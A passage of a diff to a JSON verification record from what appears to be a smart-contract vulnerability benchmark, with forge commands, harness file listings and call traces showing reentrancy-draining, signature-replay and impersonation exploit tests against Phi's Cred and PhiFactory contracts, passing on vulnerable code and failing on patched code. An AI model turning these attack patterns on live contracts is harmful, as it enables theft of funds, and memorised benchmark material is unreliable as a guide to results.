â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 500\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 500\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [825] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getCreatorRoyalty(2) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [654] Cred::getCreatorRoyalty(2) [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0, 0\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0, 0\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 9000000000000000 [9e15], 450000000000000 [4.5e14], 0\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [13070] Attacker::receive{value: 90550000000000000}()\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [1630] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::createCred{value: 1500000000000000000}(Attacker: [0x2e0673BaD4e83AA9302220Ba4a9C0f56d22Fd131], 0x00000000000000000000000000000000000000000000000000000000000f42a50000000000000000000000002e0673bad4e83aa9302220ba4a9c0f56d22fd1310000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c7183455a4c133ae270771860664b6b7ec320bb10000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000474657374000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005424153494300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000095349474e41545552450000000000000000000000000000000000000000000000, 0x1257240b01f93c61f9ed0423113c0b130766af2fdbb3693928211b3d8a5d545dbb71a2e0cef26f5b9f66ad5687f5c4fd14c8d892d49a5d3616918d386b950ab7, 0, 0)\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [1330] Cred::createCred{value: 1500000000000000000}(Attacker: [0x2e0673BaD4e83AA9302220Ba4a9C0f56d22Fd131], 0x00000000000000000000000000000000000000000000000000000000000f42a50000000000000000000000002e0673bad4e83aa9302220ba4a9c0f56d22fd1310000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c7183455a4c133ae270771860664b6b7ec320bb10000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000474657374000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005424153494300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000095349474e41545552450000000000000000000000000000000000000000000000, 0x1257240b01f93c61f9ed0423113c0b130766af2fdbb3693928211b3d8a5d545dbb71a2e0cef26f5b9f66ad5687f5c4fd14c8d892d49a5d3616918d386b950ab7, 0, 0) [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Revert] Reentrancy()\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Revert] Reentrancy()\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Revert] Reentrancy()\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Revert] ETHTransferFailed()\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Revert] ETHTransferFailed()\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Revert] ETHTransferFailed()\n    â”‚   â”‚   â”‚   â””â”€ â†� [Revert] ETHTransferFailed()\n    â”‚   â”‚   â””â”€ â†� [Revert] ETHTransferFailed()\n    â”‚   â””â”€ â†� [Revert] ETHTransferFailed()\n    â””â”€ â†� [Revert] ETHTransferFailed()\n\nBacktrace:\n  at Cred.createCred\n  at 0xfB6e58A05a05fb69893d88F67710491E3e109c8E.createCred\n  at Attacker.receive\n  at Cred.buyShareCred\n  at 0xfB6e58A05a05fb69893d88F67710491E3e109c8E.buyShareCred\n  at Attacker.receive\n  at Cred.createCred\n  at 0xfB6e58A05a05fb69893d88F67710491E3e109c8E.createCred\n  at Attacker.attack\n  at TestCred.testCredDraining\n\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.41ms (1.09ms CPU time)\n\nRan 1 test suite in 17.47ms (3.41ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/Cred.t.sol:TestCred\n[FAIL: ETHTransferFailed()] testCredDraining() (gas: 3466917)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\nTip: Run `forge test --rerun` to retry only the 1 failed test\nTip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger\n",
+        "test_name": "testCredDraining",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-06"
+      }
+    ],
+    "verification_level": "L5"
+  },
+  "fixed_sha": "552412a1f09a478b53f3821bb4c142aeda6fe530",
+  "fixed_sha_basis": "git_blob_of_patched_sources",
+  "fixed_source_paths": [
+    "src/Cred.sol",
+    "src/PhiFactory.sol"
+  ],
+  "fixed_workspace": {
+    "copy": {
+      "destination": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed",
+      "method": "copytree",
+      "ok": true,
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout"
+    },
+    "diff_applications": [],
+    "notes": [
+      "applied fixed source src/PhiFactory.sol for H-01",
+      "applied fixed source src/PhiFactory.sol for H-02",
+      "applied fixed source src/Cred.sol for H-03",
+      "applied fixed source src/Cred.sol for H-06"
+    ],
+    "patch_sources": [
+      {
+        "copied": true,
+        "destination": "src/PhiFactory.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\patch\\PhiFactory.sol",
+        "vulnerability": "H-01"
+      },
+      {
+        "copied": true,
+        "destination": "src/PhiFactory.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\patch\\PhiFactory.sol",
+        "vulnerability": "H-02"
+      },
+      {
+        "copied": true,
+        "destination": "src/Cred.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\patch\\Cred.sol",
+        "vulnerability": "H-03"
+      },
+      {
+        "copied": true,
+        "destination": "src/Cred.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\patch\\Cred.sol",
+        "vulnerability": "H-06"
+      }
+    ],
+    "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed",
+    "test_installation": [
+      {
+        "copied": true,
+        "destination": "test/Claimable.t.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\Claimable.t.sol"
+      },
+      {
+        "copied": true,
+        "destination": "test/PhiFactory.t.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\PhiFactory.t.sol"
+      },
+      {
+        "copied": true,
+        "destination": "test/CuratorRewardsDistributor.t.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\CuratorRewardsDistributor.t.sol"
+      },
+      {
+        "copied": true,
+        "destination": "test/Cred.t.sol",
+        "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\Cred.t.sol"
+      }
+    ],
+    "workspace": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed"
+  },
+  "forge_status": "patch_verified_L6",
+  "generated_at": "2026-11-20T10:28:57Z",
+  "harness_listing": [
+    "config.yaml",
+    "Dockerfile",
+    "exploit/deploy.sh",
+    "exploit/gold.sh",
+    "exploit/grade.sh",
+    "exploit/high_hints.md",
+    "exploit/low_hints.md",
+    "exploit/max.sh",
+    "exploit/max_hints.md",
+    "exploit/med_hints.md",
+    "findings/gold_audit.md",
+    "findings/H-01.md",
+    "findings/H-02.md",
+    "findings/H-03.md",
+    "findings/H-04.md",
+    "findings/H-06.md",
+    "findings/H-07.md",
+    "findings/incorrect/high/H-01.md",
+    "findings/incorrect/high/H-02.md",
+    "findings/incorrect/high/H-03.md",
+    "findings/incorrect/high/H-04.md",
+    "findings/incorrect/high/H-06.md",
+    "findings/incorrect/high/H-07.md",
+    "findings/incorrect/injection/H-01.md",
+    "findings/incorrect/injection/H-02.md",
+    "findings/incorrect/injection/H-03.md",
+    "findings/incorrect/injection/H-04.md",
+    "findings/incorrect/injection/H-06.md",
+    "findings/incorrect/injection/H-07.md",
+    "findings/incorrect/low/H-01.md",
+    "findings/incorrect/low/H-02.md",
+    "findings/incorrect/low/H-03.md",
+    "findings/incorrect/low/H-04.md",
+    "findings/incorrect/low/H-06.md",
+    "findings/incorrect/low/H-07.md",
+    "findings/low_hints.md",
+    "findings/med_hints.md",
+    "patch/Cred.sol",
+    "patch/H-01.diff",
+    "patch/H-02.diff",
+    "patch/H-03.diff",
+    "patch/H-06.diff",
+    "patch/low_hints.md",
+    "patch/med_hints.md",
+    "patch/PhiFactory.sol",
+    "test/Claimable.t.sol",
+    "test/Cred.t.sol",
+    "test/CuratorRewardsDistributor.t.sol",
+    "test/PhiFactory.t.sol"
+  ],
   "harness_path": "audits/2024-08-phi",
   "input_row": {
     "c4_refs": [
@@ -41,12 +338,127 @@
     "source": "reevmbench",
     "tx_hash": ""
   },
-  "notes": [
-    "Harness dir has neither foundry.toml nor src/; it is a metadata harness. Verbatim top-level entries: Dockerfile, config.yaml, exploit, exploit/deploy.sh, exploit/gold.sh, exploit/grade.sh, exploit/high_hints.md, exploit/low_hints.md, exploit/max.sh, exploit/max_hints.md, exploit/med_hints.md, findings, findings/H-01.md, findings/H-02.md, findings/H-03.md, findings/H-04.md, findings/H-06.md, findings/H-07.md, findings/gold_audit.md, findings/incorrect, findings/incorrect/high, findings/incorrect/high/H-01.md, findings/incorrect/high/H-02.md, findings/incorrect/high/H-03.md, findings/incorrect/high/H-04.md, findings/incorrect/high/H-06.md, findings/incorrect/high/H-07.md, findings/incorrect/injection, findings/incorrect/injection/H-01.md, findings/incorrect/injection/H-02.md, findings/incorrect/injection/H-03.md, findings/incorrect/injection/H-04.md, findings/incorrect/injection/H-06.md, findings/incorrect/injection/H-07.md, findings/incorrect/low, findings/incorrect/low/H-01.md, findings/incorrect/low/H-02.md, findings/incorrect/low/H-03.md, findings/incorrect/low/H-04.md, findings/incorrect/low/H-06.md"
+  "l6_pairs": [
+    {
+      "fixed": "FAIL",
+      "test_name": "testKuprum_Claim_with_Signature_Replay",
+      "vulnerable": "PASS"
+    },
+    {
+      "fixed": "FAIL",
+      "test_name": "testKuprum_ImpersonateArtist",
+      "vulnerable": "PASS"
+    },
+    {
+      "fixed": "FAIL",
+      "test_name": "testCredDraining",
+      "vulnerable": "PASS"
+    }
   ],
-  "pinned_commit": "af878a75d628599736c78e8fe9655a57b041206e",
-  "retrieved_at": "2026-11-20T09:44:58Z",
+  "notes": [],
+  "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
+  "retrieved_at": "2026-11-20T10:27:19Z",
+  "source_checkout": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
   "stderr_tail": "",
-  "stdout_tail": "",
-  "verification_level": "L0"
+  "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/Claimable.t.sol:TestClaimable\n[PASS] testKuprum_Claim_with_Signature_Replay() (gas: 631432)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.94ms (690.20Âµs CPU time)\n\nRan 1 test suite in 5.56ms (3.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+  "test_installation": [
+    {
+      "copied": true,
+      "destination": "test/Claimable.t.sol",
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\Claimable.t.sol"
+    },
+    {
+      "copied": true,
+      "destination": "test/PhiFactory.t.sol",
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\PhiFactory.t.sol"
+    },
+    {
+      "copied": true,
+      "destination": "test/CuratorRewardsDistributor.t.sol",
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\CuratorRewardsDistributor.t.sol"
+    },
+    {
+      "copied": true,
+      "destination": "test/Cred.t.sol",
+      "source": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\sources\\blocksecteam__ReEVMBench\\audits\\2024-08-phi\\test\\Cred.t.sol"
+    }
+  ],
+  "toolchain_note": "forge=available; anvil=available; cast=available; cached_forge_std=MISSING",
+  "verification_level": "L6",
+  "vulnerable": {
+    "build": {
+      "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
+      "exit_code": 0,
+      "stderr_tail": "tps://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:697:54\n    â”‚\n697 â”‚         if (_credIdsPerAddress[sender_].length == 0) revert EmptyArray();\n    â”‚                                                      â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:702:66\n    â”‚\n702 â”‚         if (indexToRemove >= _credIdsPerAddress[sender_].length) revert IndexOutofBounds();\n    â”‚                                                                  â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:706:40\n    â”‚\n706 â”‚         if (credId_ != credIdToRemove) revert WrongCredId();\n    â”‚                                        â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:762:21\n    â”‚\n762 â”‚ â”�                     revert ShareLockPeriodNotPassed(\n763 â”‚ â”ƒ                         block.timestamp, lastTradeTimestamp[credId][curator] + SHARE_LOCK_PERIOD\n764 â”‚ â”ƒ                     );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ src/Cred.sol:777:40\n    â”‚\n777 â”‚                 creds[credId].creator, bytes4(keccak256(\"CREATOR_ROYALTY_FEE\")), \"\"\n    â”‚                                        â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'bytes4' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[calls-loop]: external call inside a loop\n    â•­â–¸ src/Cred.sol:858:17\n    â”‚\n858 â”‚                 IBondingCurve(cred.bondingCurve).getPriceData(credId, cred.currentSupply, amount, isBuy);\n    â”‚                 â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/calls-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:842:17\n    â”‚\n842 â”‚                 revert InvalidAmount();\n    â”‚                 â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:845:17\n    â”‚\n845 â”‚                 revert InvalidCredId();\n    â”‚                 â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:850:21\n    â”‚\n850 â”‚                     revert DuplicateCredId();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:862:21\n    â”‚\n862 â”‚                     revert PriceExceedsLimit();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:865:21\n    â”‚\n865 â”‚                     revert MaxSupplyReached();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:869:21\n    â”‚\n869 â”‚                     revert PriceBelowLimit();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:873:21\n    â”‚\n873 â”‚                     revert InsufficientShares();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[environment-read-across-mutation]: `block.timestamp` may be reused across `vm.warp`\n    â•­â–¸ test/CuratorRewardsDistributor.t.sol:135:21\n    â”‚\n135 â”‚             vm.warp(block.timestamp + 10 minutes + 1 seconds);\n    â”‚             â”€â”€â”€â”€â”€â”€â”€â”€â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ `vm.warp` changes this environment here\n    â”‚\n    â”œ help: capture it with `vm.getBlockTimestamp()` instead\n    â•° help: https://getfoundry.sh/forge/linting/environment-read-across-mutation\n\n",
+      "stdout_tail": "No files changed, compilation skipped\n",
+      "timed_out": false,
+      "tool_missing": false
+    },
+    "dependency_install": null,
+    "forge_status": "exploit_success",
+    "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
+    "tests": [
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testKuprum_Claim_with_Signature_Replay -vvv",
+        "exit_code": 0,
+        "exploit_success": true,
+        "failed": false,
+        "passed": true,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/Claimable.t.sol:TestClaimable\n[PASS] testKuprum_Claim_with_Signature_Replay() (gas: 631432)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.94ms (690.20Âµs CPU time)\n\nRan 1 test suite in 5.56ms (3.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+        "test_name": "testKuprum_Claim_with_Signature_Replay",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-01"
+      },
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testKuprum_ImpersonateArtist -vvv",
+        "exit_code": 0,
+        "exploit_success": true,
+        "failed": false,
+        "passed": true,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/PhiFactory.t.sol:TestPhiFactory\n[PASS] testKuprum_ImpersonateArtist() (gas: 856709)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.20ms (553.90Âµs CPU time)\n\nRan 1 test suite in 4.62ms (3.20ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+        "test_name": "testKuprum_ImpersonateArtist",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-02"
+      },
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testBloatingBalances --gas-limit 2000000000 --isolate -vvv",
+        "exit_code": 1,
+        "exploit_success": false,
+        "failed": true,
+        "passed": false,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "”œâ”€ [0] VM::warp(3404001 [3.404e6])\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [133956] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::sellShareCred(1, 1, 0)\n    â”‚   â”œâ”€ [109807] Cred::sellShareCred(1, 1, 0) [delegatecall]\n    â”‚   â”‚   â”œâ”€ [9484] BondingCurve::getPriceData(1, 2, 1, false) [staticcall]\n    â”‚   â”‚   â”‚   â”œâ”€ [825] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getCreatorRoyalty(1) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ [654] Cred::getCreatorRoyalty(1) [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 100, 100\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 100, 100\n    â”‚   â”‚   â”‚   â”œâ”€ [2579] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::protocolFeePercent() [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ [2417] Cred::protocolFeePercent() [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 500\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 500\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 1030070150310631 [1.03e15], 51503507515531 [5.15e13], 10300701503106 [1.03e13]\n    â”‚   â”‚   â”œâ”€ [0] 0x0000000000000000000000000000000000001387::receive{value: 968265941291994}()\n    â”‚   â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â”‚   â”œâ”€ [0] protocolFeeDestination::receive{value: 51503507515531}()\n    â”‚   â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â”‚   â”œâ”€ [8695] PhiRewards::deposit{value: 10300701503106}(participant: [0x426eDFE017AE01898D388C899A66F067124AC23B], 0xc344fd26, \"\")\n    â”‚   â”‚   â”‚   â”œâ”€ emit Deposit(from: 0xfB6e58A05a05fb69893d88F67710491E3e109c8E, to: participant: [0x426eDFE017AE01898D388C899A66F067124AC23B], reason: 0xc344fd26, amount: 10300701503106 [1.03e13], comment: \"\")\n    â”‚   â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â”‚   â”œâ”€ emit Royalty(creator: participant: [0x426eDFE017AE01898D388C899A66F067124AC23B], credId: 1, Amount: 10300701503106 [1.03e13])\n    â”‚   â”‚   â”œâ”€ emit Trade(curator: 0x0000000000000000000000000000000000001387, credId: 1, isBuy: false, amount: 1, ethAmount: 1030070150310631 [1.03e15], protocolEthAmount: 51503507515531 [5.15e13], supply: 1)\n    â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [5320] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getCuratorAddressLength(1) [staticcall]\n    â”‚   â”œâ”€ [2652] Cred::getCuratorAddressLength(1) [delegatecall]\n    â”‚   â”‚   â””â”€ â†� [Return] 4001\n    â”‚   â””â”€ â†� [Return] 4001\n    â”œâ”€ [0] VM::prank(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [31297946] CuratorRewardsDistributor::distribute(1)\n    â”‚   â”œâ”€ [5225] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::isExist(1) [staticcall]\n    â”‚   â”‚   â”œâ”€ [2557] Cred::isExist(1) [delegatecall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] true\n    â”‚   â”‚   â””â”€ â†� [Return] true\n    â”‚   â”œâ”€ [31203507] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getCuratorAddresses(1, 0, 0) [staticcall]\n    â”‚   â”‚   â”œâ”€ [31203321] Cred::getCuratorAddresses(1, 0, 0) [delegatecall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266]\n    â”‚   â”‚   â””â”€ â†� [Return] [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266]\n    â”‚   â”œâ”€ [1074] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getShareNumber(1, owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266]) [staticcall]\n    â”‚   â”‚   â”œâ”€ [900] Cred::getShareNumber(1, owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266]) [delegatecall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 1\n    â”‚   â”‚   â””â”€ â†� [Return] 1\n    â”‚   â”œâ”€ [1074] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getShareNumber(1, owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266]) [staticcall]\n    â”‚   â”‚   â”œâ”€ [900] Cred::getShareNumber(1, owner: 